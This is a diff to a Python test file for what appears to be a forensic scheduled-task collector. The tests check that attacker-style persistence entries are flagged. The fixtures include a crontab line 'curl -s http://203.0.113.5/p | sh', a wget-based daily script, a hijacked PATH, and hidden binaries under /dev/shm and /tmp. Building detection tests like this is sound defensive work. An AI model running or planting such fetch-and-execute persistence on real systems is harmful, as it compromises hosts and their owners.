@@ -89,26 +89,26 @@ def _one(rows: list[dict], **kv) -> dict:
 
 
 def test_a_system_crontab_line_is_split_into_schedule_user_and_command(tasks):
-    r = _one(tasks, mechanism="cron", file="etc/crontab")
-    assert (r["schedule"], r["user"], r["command"]) == (
+    r = _one(tasks, mechanism="cron", source_file="etc/crontab")
+    assert (r["schedule"], r["user"], r["command_line"]) == (
         "17 * * * *", "root", "cd / && run-parts --report /etc/cron.hourly")
     assert r["modified_utc"] == "2026-01-02 10:00:00" and r["suspicious"] == ""
-    assert _one(tasks, file="etc/cron.d/sync", mechanism="cron")["schedule"] == "@reboot"
+    assert _one(tasks, source_file="etc/cron.d/sync", mechanism="cron")["schedule"] == "@reboot"
 
 
 def test_a_spool_line_belongs_to_its_file_and_carries_its_runs(tasks):
     """The user spool names its user by file name, and cron_log says how often
     the line ran -- a line installed last night and run every five minutes since."""
-    r = _one(tasks, file="var/spool/cron/crontabs/jdoe", mechanism="cron")
+    r = _one(tasks, source_file="var/spool/cron/crontabs/jdoe", mechanism="cron")
     assert (r["user"], r["schedule"]) == ("jdoe", "*/5 * * * *")
-    assert r["command"] == "curl -s http://203.0.113.5/p | sh"
+    assert r["command_line"] == "curl -s http://203.0.113.5/p | sh"
     assert (r["runs"], r["last_run_utc"]) == ("2", "2026-05-19 10:05:00")
     assert r["modified_utc"] == "2026-05-18 22:41:07"
     assert r["suspicious"] == "yes" and "curl" in r["reason"]
 
 
 def test_environment_lines_are_flagged_only_when_they_redirect_every_job(tasks):
-    env = {r["command"]: r["suspicious"] for r in tasks if r["mechanism"] == "cron environment"}
+    env = {r["command_line"]: r["suspicious"] for r in tasks if r["mechanism"] == "cron environment"}
     assert env["SHELL=/bin/sh"] == "" and env["MAILTO=jdoe"] == ""
     assert env["PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin"] == ""
     assert env["PATH=/tmp/.b:/usr/bin"] == "yes"
@@ -117,9 +117,9 @@ def test_environment_lines_are_flagged_only_when_they_redirect_every_job(tasks):
 
 def test_anacron_and_the_periodic_scripts(tasks):
     a = _one(tasks, mechanism="anacron")
-    assert a["schedule"].startswith("every 1 ") and a["command"].startswith("run-parts")
-    assert _one(tasks, file="etc/cron.daily/backup")["suspicious"] == ""
-    upd = _one(tasks, file="etc/cron.daily/upd")
+    assert a["schedule"].startswith("every 1 ") and a["command_line"].startswith("run-parts")
+    assert _one(tasks, source_file="etc/cron.daily/backup")["suspicious"] == ""
+    upd = _one(tasks, source_file="etc/cron.daily/upd")
     assert upd["suspicious"] == "yes" and "wget -q" in upd["reason"]
     assert upd["schedule"] == "daily"
 
@@ -127,28 +127,28 @@ def test_anacron_and_the_periodic_scripts(tasks):
 def test_an_at_job_says_when_it_runs_and_what_after_the_preamble(tasks):
     r = _one(tasks, mechanism="at")
     assert r["schedule"] == "once at 2026-05-19 22:30 UTC"
-    assert r["command"] == "/dev/shm/.u/upd"
+    assert r["command_line"] == "/dev/shm/.u/upd"
     assert r["user"] == "jdoe"                      # bodyfile uid -> passwd
     assert r["suspicious"] == "yes"
 
 
 def test_a_timer_carries_the_command_it_starts_and_when_it_ran(tasks):
-    r = _one(tasks, file="etc/systemd/system/backup.timer")
+    r = _one(tasks, source_file="etc/systemd/system/backup.timer")
     assert r["schedule"] == "OnCalendar=*-*-* 03:00:00"
-    assert (r["user"], r["command"]) == ("jdoe", "/usr/local/bin/backup --all")
+    assert (r["user"], r["command_line"]) == ("jdoe", "/usr/local/bin/backup --all")
     assert r["state"] == ("next Wed 2026-05-20 03:00:00 CEST; "
                           "last Tue 2026-05-19 03:00:00 CEST")
-    u = _one(tasks, file="home/jdoe/.config/systemd/user/beacon.timer")
+    u = _one(tasks, source_file="home/jdoe/.config/systemd/user/beacon.timer")
     assert u["user"] == "jdoe" and u["suspicious"] == "yes"
 
 
 def test_a_loaded_timer_with_no_unit_file_is_still_a_row(tasks):
-    r = _one(tasks, mechanism="systemd timer", file="")
-    assert r["command"] == "(starts ghost.service)"
+    r = _one(tasks, mechanism="systemd timer", source_file="")
+    assert r["command_line"] == "(starts ghost.service)"
     assert r["state"].startswith("next n/a; last Tue 2026-05-19 09:00:00 CEST")
 
 
 def test_flagged_rows_come_first(tasks):
     flags = [r["suspicious"] for r in tasks]
     assert flags == sorted(flags, key=lambda s: s != "yes")
-    assert _one(tasks, mechanism="cron access")["file"] == "etc/cron.allow"
+    assert _one(tasks, mechanism="cron access")["source_file"] == "etc/cron.allow"
